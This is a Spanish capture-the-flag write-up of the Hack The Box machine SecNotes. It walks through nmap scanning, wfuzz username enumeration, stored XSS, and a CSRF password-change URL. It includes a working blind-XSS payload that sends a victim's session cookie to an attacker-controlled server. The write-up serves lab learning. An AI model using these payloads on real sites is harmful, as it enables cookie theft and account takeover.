I"ûp<p>En esta ocasi√≥n vamos a estar resolviendo la m√°quina <em>SecNotes</em> de <em>Hack The Box</em>. Es una m√°quina <em>Windows</em> de nivel de dificultad medio en la intrusi√≥n, y medio en la escalada de privilegios seg√∫n figura en la plataforma.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/1.png" alt="" /></p>

<h3 id="fase-de-reconocimiento"><a href="#header-3"></a>Fase De Reconocimiento</h3>

<p>Primeramente vamos a lanzar una <em>traza ICMP</em> para saber si la m√°quina est√° activa.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.10.97
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/2.png" alt="" /></p>

<p>Una vez comprobamos que la m√°quina est√° activa (pues nos devuelve una respuesta), podemos tambi√©n determinar a que tipo de m√°quina nos estamos enfrentando en base al valor del <em>TTL</em>; en este caso el valor del <em>TTL</em> de la m√°quina es <code class="language-plaintext highlighter-rouge">127</code>, por lo que podemos intuir que estamos ante una m√°quina <em>Windows</em>. Recordemos que algunos de los valores referenciales son los siguientes:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Sistema Operativo (OS)</th>
      <th style="text-align: left">TTL</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">Linux</td>
      <td style="text-align: left">64</td>
    </tr>
    <tr>
      <td style="text-align: left">Windows</td>
      <td style="text-align: left">128</td>
    </tr>
    <tr>
      <td style="text-align: left">Solaris</td>
      <td style="text-align: left">254</td>
    </tr>
  </tbody>
</table>

<p>Si nos damos cuenta, en esta ocasi√≥n, el valor del <em>TTL</em> es <code class="language-plaintext highlighter-rouge">127</code> y no <code class="language-plaintext highlighter-rouge">128</code> como indica la tabla anterior, esto se debe a que en el entorno de m√°quinas de <em>Hack The Box</em>, no nos comunicamos directamente con la m√°quina a vulnerar, sino que existe un intermediario, por lo que el <em>TTL</em> disminuye en una unidad.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.10.97 -R
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/3.png" alt="" /></p>

<p>Posteriormente, vamos a utilizar la herramienta <em>Nmap</em> para determinar que puertos est√°n abiertos, as√≠ como identificar la versi√≥n y servicios que corren en el activo. Para determinar que puertos est√°n abiertos podemos realizar lo siguiente:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> 10.10.10.97
</code></pre></div></div>

<p>Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.97
</code></pre></div></div>

<p>A continuaci√≥n se explican los par√°metros utilizados en el escaneo de puertos con <em>Nmap</em>:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Par√°metro</th>
      <th style="text-align: left">Explicaci√≥n</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">-p-</td>
      <td style="text-align: left">Escanea todo el rango de puertos (65535 en total)</td>
    </tr>
    <tr>
      <td style="text-align: left">--open</td>
      <td style="text-align: left">Nos indica todos aquellos puertos que est√°n abiertos (o posiblemente abiertos)</td>
    </tr>
    <tr>
      <td style="text-align: left">-T5</td>
      <td style="text-align: left">La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, ‚Äúgeneraremos m√°s ruido‚Äù, pero no pasa nada ¬øno? Al fin y al cabo estamos practicando en un entorno controlado y aqu√≠ somos todos <code class="language-plaintext highlighter-rouge">White Hat</code></td>
    </tr>
    <tr>
      <td style="text-align: left">-v</td>
      <td style="text-align: left"><em>Verbose</em>, reporta lo encontrado por consola</td>
    </tr>
    <tr>
      <td style="text-align: left">-n</td>
      <td style="text-align: left">No aplicar <em>resoluci√≥n DNS</em></td>
    </tr>
    <tr>
      <td style="text-align: left">-sS</td>
      <td style="text-align: left">Escaneo <em>TCP SYN</em></td>
    </tr>
    <tr>
      <td style="text-align: left">-min-rate</td>
      <td style="text-align: left">Emitir paquetes no m√°s lentos que &lt;valor&gt; por segundo</td>
    </tr>
    <tr>
      <td style="text-align: left">-vvv</td>
      <td style="text-align: left">Triple <em>verbose</em>, para obtener mayor informaci√≥n por consola</td>
    </tr>
    <tr>
      <td style="text-align: left">-Pn</td>
      <td style="text-align: left">No aplicar <em>host discovery</em></td>
    </tr>
  </tbody>
</table>

<p>Una vez hemos detectado los puertos que se encuentran abiertos en el activo, podemos pasar a determinar la versi√≥n y servicios que corren bajo estos puertos.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p</span> 80,445,8808 10.10.10.97
</code></pre></div></div>

<p>A continuaci√≥n se explican los par√°metros utilizados en el escaneo de versiones y servicios con <em>Nmap</em>:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Par√°metro</th>
      <th style="text-align: left">Explicaci√≥n</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">-sC</td>
      <td style="text-align: left">Scripts b√°sicos de enumeraci√≥n</td>
    </tr>
    <tr>
      <td style="text-align: left">-sV</td>
      <td style="text-align: left">Versi√≥n y servicios que corren bajo los puertos encontrados</td>
    </tr>
    <tr>
      <td style="text-align: left">-p</td>
      <td style="text-align: left">Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior)</td>
    </tr>
  </tbody>
</table>

<p>Bas√°ndonos en la informaci√≥n que nos reporta <em>Nmap</em>, podemos darnos cuenta que la m√°quina v√≠ctima tiene abiertos puertos relacionados con <code class="language-plaintext highlighter-rouge">HTTP</code>, as√≠ como con <code class="language-plaintext highlighter-rouge">SMB</code> (Server Message Block).</p>

<p>Empezando por el puerto <code class="language-plaintext highlighter-rouge">80</code> y <code class="language-plaintext highlighter-rouge">8808</code> podemos ver que ambas p√°ginas est√°n montadas sobre <code class="language-plaintext highlighter-rouge">IIS</code> (Internet Information Services), un servidor web para <em>Microsft Windows</em>.</p>

<p>Echemos un vistazo desde <code class="language-plaintext highlighter-rouge">WhatWeb</code>, una herramienta que se encarga de identificar las tecnolog√≠as web que se est√°n empleando, v√©ase gestores de contenido (CMS), librerias o plugins, o finalmente el sistema operativo que se est√° utilizando para alojar el servidor web.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb http://10.10.10.97
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb http://10.10.10.97:8808
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/4.png" alt="" /></p>

<p>No hay nada que llame especialmente nuestra atenci√≥n, m√°s que el redireccionamiento que realiza la primera p√°gina hacia lo que parece ser un panel de login, y el t√≠tulo de la segunda p√°gina web que es el que viene por defecto al montarla con <code class="language-plaintext highlighter-rouge">IIS</code>.</p>

<p>En vista de que ya no nos es posible trabajar desde la terminal, tendremos que visitar estas p√°ginas desde nuestro navegador.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/5.png" alt="" /></p>

<p>Lo primero que nos puede venir a la mente al ver un panel de login, ser√≠a probar credenciales por defecto, sin embargo este no va a ser el caso.</p>

<p>Algo interesante que voy a comentar solo como curiosidad, es que si ingresamos un nombre de usuario que no existe en el sistema, la p√°gina nos devolver√° el siguiente mensaje.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/6.png" alt="" /></p>

<p>Algo que resulta cr√≠tico, ya que teniendo control sobre este mensaje, podemos aplicar fuerza bruta sobre el campo <code class="language-plaintext highlighter-rouge">Username</code> para descubrir usuarios v√°lidos.</p>

<p>Esto ser√≠a f√°cil de ejecutar teniendo a mano herramientas como <code class="language-plaintext highlighter-rouge">Wfuzz</code> y diccionarios como <a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt">SecLists</a>, que nos provee entre tantas cosas, un diccionario dedicado a nombres de usuario comunes.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install wfuzz
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/danielmiessler/SecLists
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">-L</span> <span class="nt">-t</span> 400 <span class="nt">--hs</span> <span class="s2">"No account found with that username."</span> <span class="nt">-w</span> /direcci√≥n/del/diccionario/SecLists/Usernames/Names/names.txt <span class="nt">-d</span> <span class="s2">"username=FUZZ&amp;password=noConocemosLaContrase√±a"</span> http://10.10.10.97
</code></pre></div></div>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Par√°metro</th>
      <th style="text-align: left">Explicaci√≥n</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">-c</td>
      <td style="text-align: left">Output colorizado</td>
    </tr>
    <tr>
      <td style="text-align: left">-L</td>
      <td style="text-align: left">Sigue las redirecciones HTTP, de modo que conseguimos el c√≥digo de estado final verdadero</td>
    </tr>
    <tr>
      <td style="text-align: left">-t</td>
      <td style="text-align: left">Espec√≠ficamos el n√∫mero de hilos con el queremos trabajar</td>
    </tr>
    <tr>
      <td style="text-align: left">--hs</td>
      <td style="text-align: left">Oculta las respuestas con la expresi√≥n regular que indiquemos, en este caso controlamos el mensaje de  error</td>
    </tr>
    <tr>
      <td style="text-align: left">-w</td>
      <td style="text-align: left">Especificamos el diccionario con el que queremos trabajar</td>
    </tr>
    <tr>
      <td style="text-align: left">-d</td>
      <td style="text-align: left">Especificamos la petici√≥n por POST</td>
    </tr>
  </tbody>
</table>

<p>En caso de que aplicasemos fuerza bruta sobre este campo, descubrir√≠amos que el usuario <code class="language-plaintext highlighter-rouge">tyler</code> existe dentro del sistema, por lo que ahora tendr√≠amos que aplicar fuerza bruta sobre el campo <code class="language-plaintext highlighter-rouge">Password</code>, para lo cual ya no tendremos tanta suerte, ya que como veremos m√°s adelante, su contrase√±a es bastante robusta, por lo que no es suceptible a ataques por diccionario.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/7.png" alt="" /></p>

<p>Respecto a la segunda p√°gina no hay pr√°cticamente nada que podamos hacer, por el momento, al menos.</p>

<h3 id="fase-de-explotaci√≥n"><a href="#header-3"></a>Fase De Explotaci√≥n</h3>

<p>La m√°quina <em>SecNotes</em> cuenta con dos v√≠as potenciales para realizar la intrusi√≥n, una v√≠a <a href="https://mateonitro550.github.io/SQL-Injection">inyecciones SQL</a> y otra v√≠a <a href="https://mateonitro550.github.io/Cross-Site-Request-Forgery-(CSRF)">CSRF</a> (Cross-Site Request Forgery).</p>

<h3 id="cross-site-request-forgery"><a href="#header-3"></a>Cross-Site Request Forgery</h3>

<p>En vista de que las credenciales por defecto no funcionaron, podemos hacer lo que har√≠a un usuario normal, registrarnos, no todo se trata de romper.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/8.png" alt="" /></p>

<p>Una vez hemos creado una cuenta, podemos logearnos, y veremos un panel bastante sencillo, pero donde destaca un nombre, <code class="language-plaintext highlighter-rouge">tyler</code>, un posible usuario potencial, que como mencion√© antes, pod√≠amos haberlo descubierto por fuerza bruta.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/9.png" alt="" /></p>

<p>Por otra parte, vemos que la p√°gina nos permite crear una serie de notas, hag√°moslo.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/10.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/11.png" alt="" /></p>

<p>Vemos que el mecanismo de la p√°gina es bastante simple, pero si durante el desarrollo de la misma, no se tuvo en consideraci√≥n ning√∫n tipo de seguridad, quiz√° esta sea vulnerable a algo tan b√°sico como confiar plenamente en el input del usuario.</p>

<p>Intentemos ya algo no intencionado como una <a href="https://mateonitro550.github.io/HTML-Injection">inyecci√≥n HTML</a>.</p>

<p>En el campo <em>Title</em> podemos escribir cualquier cosa, aunque perfectamente podr√≠a ser la inyecci√≥n, y en el campo <em>Note</em>, colocaremos lo siguiente:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;h1&gt;</span>Una frase cualquiera<span class="nt">&lt;/h1&gt;</span>
</code></pre></div></div>

<p>De este modo el texto que introduzcamos cambiar√° su formato al de <em>header 1</em>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/12.png" alt="" /></p>

<p>O por ejemplo, podemos hacer que nuestro texto se desplace:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;marquee&gt;</span>Una frase cualquiera<span class="nt">&lt;/marquee&gt;</span>
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/13.png" alt="" /></p>

<p>Vemos que como atacantes, tenemos la capacidad de inyectar c√≥digo al propio c√≥digo fuente de la p√°gina web. ¬øQu√© tal si probamos ahora un <a href="https://mateonitro550.github.io/https://mateonitro550.github.io/Cross-Site-Scripting-(XSS)">XSS</a> (Cross-Site Scripting)?</p>

<p>Igual que antes, en el campo <em>Title</em> podemos escribir cualquier cosa, y en el campo <em>Note</em>, colocaremos lo siguiente:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Una frase cualquiera</span><span class="dl">"</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p>Podemos observar que cada vez que la p√°gina web se recarga, aparece un mensaje con el texto que indicamos anteriormente.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/14.png" alt="" /></p>

<p>¬øQu√© tal si en vez de mostrar por pantalla una frase cualquiera, listamos mejor informaci√≥n relevante como la cookie de sesi√≥n?</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/15.png" alt="" /></p>

<p>Una vez comprobamos que tenemos la capacidad de visualizar nuestra propia cookie de sesi√≥n a trav√©s de ventanas emergentes (pop-ups), podemos empezar a esbozar una posible v√≠a potencial para la intrusi√≥n.</p>

<p>Podemos intentar efectuar un <code class="language-plaintext highlighter-rouge">Cookie Hijacking</code>, ya que secuestrando la cookie de sesi√≥n de otro usuario, si este tiene su sesi√≥n abierta, podr√≠amos ‚Äòlogearnos‚Äô sin proporcionar credenciales, √∫nicamente el valor de su cookie.</p>

<p>Adicionalmente, tenemos que pensar en una forma de obtener el valor de la cookie directamente en nuestro equipo de atacantes, ya que de momento, estas ventanas solo son visibles por los usuarios cuando est√°n en su panel de inicio, adem√°s de que llaman bastante la atenci√≥n. Para ello, haremos uso de un <a href="https://mateonitro550.github.io/https://mateonitro550.github.io/Cross-Site-Scripting-(XSS)">Blind XSS</a>.</p>

<p>Empezaremos por crear un servidor con <code class="language-plaintext highlighter-rouge">Python</code>, en el cual recibiremos las cookies de los usuarios cada que estos refresquen, o se encuentren en su panel de inicio.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
</code></pre></div></div>

<p>A continuaci√≥n, crearemos una nota con el siguiente mensaje:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;img src="http://nuestraDirecci√≥nIP:80/cookie=</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">"&gt;</span><span class="dl">'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/16.png" alt="" /></p>

<p>En vista de que recibimos nuestra propia cookie de sesi√≥n directamente en nuestro equipo, ser√≠a solo cuesti√≥n de tiempo para hacernos con las cookies de otros usuarios, si los existiera, claro est√°.</p>

<p>Por obvias razones no existen m√°s clientes que interactuen con el servidor web, a excepci√≥n de uno. Si recordamos, el mensaje inicial que aparec√≠a en la p√°gina, mencionaba que nos pongamos en contacto con <code class="language-plaintext highlighter-rouge">tyler</code> a trav√©s del bot√≥n <em>Contact Us</em>; as√≠ que lo primero que haremos sera  comprobar si este lee nuestros mensajes, para ello le enviaremos un url que apunte a nuestra m√°quina.</p>

<p>Es importante mencionar que no podemos ocultar nuestro url con <em>href</em>, <em>acortadores</em>, <em>iframe</em> o alg√∫n otro m√©todo, ya que al ser un usuario simulado, este no lo gestiona muy bien. Por su parte, un usuario real, a no ser a que tenga nulos conocimientos de seguridad inform√°tica, abrir√≠a un enlace que le env√≠a un total desconocido.</p>

<p>Sin cerrar nuestro servidor hosteado con <code class="language-plaintext highlighter-rouge">Python</code>, a trav√©s del bot√≥n <em>Contact Us</em>, enviaremos el siguiente mensaje para confirmar si <code class="language-plaintext highlighter-rouge">tyler</code> lee nuestros mensajes:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://nuestraDirecci√≥nIP:80/tylerEst√°Presente
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/17.png" alt="" /></p>

<p>Vemos que conseguimos una petici√≥n por GET por parte de la m√°quina v√≠ctima, por lo que asumimos que este lee nuestros mensajes. Ya con esto podemos pensar que tenemos una posible v√≠a potencial para hacernos con la cookie del usuario. Por lo cual, enviaremos el siguiente mensaje:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;img src="http://nuestraDirecci√≥nIP:80/cookie=</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">"&gt;</span><span class="dl">'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/18.png" alt="" /></p>

<p>Para nuestra sorpresa, esto no funciona, as√≠ que tendremos que buscar otra alternativa.</p>

<p>Investigando un poco m√°s, si decidimos cambiar nuestra contrase√±a, nos daremos cuenta que la p√°gina no nos solicita nuestra contrase√±a anterior, o alg√∫n otro m√©todo de verificaci√≥n en dos pasos.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/19.png" alt="" /></p>

<p>Adicionalmente, si revisamos esta petici√≥n con <code class="language-plaintext highlighter-rouge">Burp Suite</code>, nos daremos cuenta que no existe alg√∫n tipo de <a href="https://portswigger.net/web-security/csrf/tokens">CSRF Token</a>, por lo que en principio, podr√≠amos modificar esta petici√≥n a nuestro antojo.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/20.png" alt="" /></p>

<p>Lo que haremos ser√° cambiar esta petici√≥n que se est√° tramitando por POST, a GET. De modo que no haya que proporcionar los campos <code class="language-plaintext highlighter-rouge">Password</code> y <code class="language-plaintext highlighter-rouge">Confirm Password</code> de forma manual, nosotros lo haremos a trav√©s de la propia URL.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/21.png" alt="" /></p>

<p>Para ello, desde <code class="language-plaintext highlighter-rouge">Burp Suite</code>, habiendo capturado la petici√≥n del cambio de contrase√±a, simplemente haremos <em>click derecho</em>, <em>Change request method</em>, y copiaremos la petici√≥n por GET.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/22.png" alt="" /></p>

<p>De esta manera, si a√±adimos <em>http://10.10.10.97</em> al inicio de la petici√≥n que acabamos de copiar, generaremos un URL capaz de cambiar las contrase√±as a trav√©s del m√©todo GET; prob√©moslo.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/23.png" alt="" /></p>

<p>Posteriormente, proseguiremos a logearnos con la contrase√±a que establecimos en el URL.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/24.png" alt="" /></p>

<p>Ya una vez dentro, encontraremos una nota, con lo que parece ser un usuario y contrase√±a para un recurso compartido; si recordamos de nuestro escaneo con <em>Nmap</em>, el puerto <code class="language-plaintext highlighter-rouge">445</code> estaba abierto.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/25.png" alt="" /></p>

<h3 id="sql-injection"><a href="#header-3"></a>SQL Injection</h3>

<p>Otro vector que podriamos considerar al encontrarnos frente a un panel de login ser√≠a probar <a href="https://mateonitro550.github.io/SQL-Injection">Inyecciones SQL</a>. De este modo lo que estamos haciendo es bypassear el panel con expresiones</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/26.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/27.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/28.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/29.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/30.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/31.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/32.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/33.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/34.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/35.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/36.png" alt="" /></p>

<h3 id="escalada-de-privilegios"><a href="#header-3"></a>Escalada De Privilegios</h3>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/37.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/38.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/39.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/40.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/41.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/42.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/43.png" alt="" /></p>
:ET